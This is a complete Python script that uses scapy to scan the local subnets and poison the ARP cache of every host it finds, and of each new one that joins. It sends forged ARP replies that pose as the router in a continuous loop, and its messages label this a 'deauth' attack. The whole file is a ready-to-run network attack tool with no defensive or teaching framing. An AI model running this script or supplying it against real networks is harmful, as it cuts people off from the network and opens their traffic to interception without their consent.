import threading
import time
import socket
import psutil
import signal
import sys
from scapy.all import ARP, send, srp, Ether, conf, get_if_hwaddr

# Global shared data
attacked_devices = set()
device_lock = threading.Lock()
stop_event = threading.Event()

def get_local_subnets():
    subnets = []
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family.name == "AF_INET":
                ip = addr.address
                if not ip.startswith("169.254") and ip != "127.0.0.1":
                    subnets.append(f"{ip}/24")
    return subnets

def get_own_ip():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

own_ip = get_own_ip()

def scan_subnet(subnet):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
    return [received.psrc for _, received in ans]

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for _, received in ans:
        return received.hwsrc
    return None

def send_deauth(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    attacker_mac = get_if_hwaddr(conf.iface)

    if not target_mac or not router_mac:
        print(f"[!] Skipping {target_ip} - MAC resolution failed", flush=True)
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=attacker_mac)
    print(f"[+] Starting deauth on {target_ip}", flush=True)

    while not stop_event.is_set():
        send(packet, verbose=False)
        time.sleep(0.5)

def find_router_ip(hosts):
    for host in hosts:
        if get_mac(host):  # Assume device that responds is router
            return host
    return None

def attack_new_devices(subnet, router_ip):
    global attacked_devices
    while not stop_event.is_set():
        print(f"[~] Scanning for new devices in {subnet}...", flush=True)
        hosts = scan_subnet(subnet)
        with device_lock:
            new_devices = [host for host in hosts if host not in attacked_devices and host != router_ip and host != own_ip]
            for new_device in new_devices:
                print(f"[+] New device detected: {new_device} - Launching deauth", flush=True)
                attacked_devices.add(new_device)
                threading.Thread(target=send_deauth, args=(new_device, router_ip), daemon=True).start()
        time.sleep(5)

def signal_handler(sig, frame):
    print("\n[!] Termination requested by user. Exiting gracefully...", flush=True)
    stop_event.set()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    subnets = get_local_subnets()
    print(f"[+] Found subnets: {subnets}", flush=True)

    for subnet in subnets:
        hosts = scan_subnet(subnet)
        router_ip = find_router_ip(hosts)

        if router_ip:
            print(f"[+] Router detected: {router_ip}", flush=True)
            with device_lock:
                for host in hosts:
                    if host != router_ip and host != own_ip:
                        attacked_devices.add(host)
                        print(f"[+] Launching initial attack on {host}", flush=True)
                        threading.Thread(target=send_deauth, args=(host, router_ip), daemon=True).start()

            threading.Thread(target=attack_new_devices, args=(subnet, router_ip), daemon=True).start()
        else:
            print(f"[!] No router found in subnet {subnet}", flush=True)

    # Keep main thread alive
    while not stop_event.is_set():
        time.sleep(1)

if __name__ == "__main__":
    main()
